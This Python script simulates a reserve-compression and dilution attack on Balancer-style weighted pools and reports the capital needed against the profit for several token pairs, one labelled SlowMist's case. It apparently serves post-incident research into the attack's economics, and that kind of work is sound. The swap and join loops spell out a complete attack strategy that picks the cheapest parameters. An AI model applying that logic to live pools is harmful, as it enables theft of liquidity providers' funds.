"""
Quantify the real exploit economics on *balanced* pools (arb-priced reserves),
i.e. the only fair baseline. Uses the exact contract arithmetic.

For a chosen compression factor r (target reserve = bO0/r) we measure:
  * capital needed  = max(input token spent while compressing, target deposited while diluting)
  * profit          = value of the reserves the attacker never paid for
and we pick the r that minimises capital for a given profit.
"""
from bmath_sim import *

ETH_USD, BTC_USD, USD_USD = 3000.0, 100000.0, 1.0
fee = 3 * 10**14  # 0.03%


def build(dec_t, w_t, tvl_usd, px_t, dec_i, w_i, px_i):
    """balanced 2-token pool of the given TVL and weights"""
    v_t = tvl_usd * w_t / (w_t + w_i)
    v_i = tvl_usd * w_i / (w_t + w_i)
    b_t = int(v_t / px_t * 10**dec_t)
    b_i = int(v_i / px_i * 10**dec_i)
    return Pool([{"sym": "T", "dec": dec_t, "bal": b_t, "denorm": int(w_t * BONE)},
                 {"sym": "I", "dec": dec_i, "bal": b_i, "denorm": int(w_i * BONE)}], fee=fee)


def run(dec_t, w_t, dec_i, w_i, tvl_usd, px_t, px_i, label):
    p0 = build(dec_t, w_t, tvl_usd, px_t, dec_i, w_i, px_i)
    bO0 = p0.t["T"]["bal"]
    bI0 = p0.t["I"]["bal"]
    rows = []
    for expo in [2, 3, 4, 5, 6, 7, 8, 9, 10, 12]:
        r = 10**expo
        D = max(bO0 // r, 2)
        if D >= bO0:
            continue
        p = build(dec_t, w_t, tvl_usd, px_t, dec_i, w_i, px_i)
        spent_i, calls = 0, 0
        ok = True
        while p.t["T"]["bal"] > D:
            aO = min(bmul(p.t["T"]["bal"], MAX_OUT_RATIO), p.t["T"]["bal"] - D)
            if aO == 0:
                ok = False
                break
            try:
                aI = p.swapExactAmountOut("I", 2**255, "T", aO, 2**300)
            except Revert:
                ok = False
                break
            spent_i += aI
            calls += 1
            if calls > 400:
                ok = False
                break
        if not ok:
            continue
        # dilute until we own ~99.99% of supply
        ps0 = p.pS
        dep_t, mcalls = 0, 0
        while p.pS < ps0 * 10**4 and mcalls < 400:
            cap = bmul(p.t["T"]["bal"], MAX_IN_RATIO)
            aI = cap if cap >= 1 else 1
            try:
                p.joinswapExternAmountIn("T", aI, 0)
                dep_t += aI
            except Revert:
                try:
                    p.joinswapExternAmountIn("T", 1, 0)
                    dep_t += 1
                except Revert:
                    break
            mcalls += 1
        share = (p.pS - ps0) / p.pS
        profit_usd = tvl_usd * w_i / (w_t + w_i) * share   # value of reserve I stolen
        capital_usd = max(spent_i * px_i / 10**dec_i, dep_t * px_t / 10**dec_t)
        rows.append((r, calls, mcalls, capital_usd, profit_usd))
    print(f"\n{label}   (TVL ${tvl_usd/1e6:.2f}M, target {w_t/(w_t+w_i):.0%} weight, "
          f"{dec_t} dec)")
    print(f"  {'compress':>9} {'swaps':>6} {'mints':>6} {'capital needed':>18} {'profit':>16} {'profit/capital':>15}")
    for r, c1, c2, cap, pr in rows:
        print(f"  {r:>9,} {c1:>6} {c2:>6} {'$'+format(cap, ',.0f'):>18} "
              f"{'$'+format(pr, ',.0f'):>16} {100*pr/cap if cap else 0:>14.2f}%")
    if rows:
        best = min(rows, key=lambda x: x[3])
        print(f"  -> cheapest: compression 1:{best[0]:,} needs ${best[3]:,.0f} of flash "
              f"liquidity for ${best[4]:,.0f} of profit ({100*best[4]/best[3]:.2f}% ROI/block)")


if __name__ == "__main__":
    run(8, 1, 18, 1, 1_000_000, BTC_USD, ETH_USD, "50/50 WBTC(8d)/WETH  [SlowMist's case]")
    run(8, 2, 18, 8, 1_000_000, BTC_USD, ETH_USD, "20/80 WBTC(8d)/WETH")
    run(18, 1, 18, 1, 1_000_000, ETH_USD, 1.0, "50/50 WETH(18d)/USDC 18d")
    run(18, 2, 18, 8, 1_000_000, ETH_USD, 1.0, "20/80 WETH(18d)/USDC 18d")
    run(6, 1, 18, 1, 1_000_000, USD_USD, ETH_USD, "50/50 USDC(6d)/WETH")
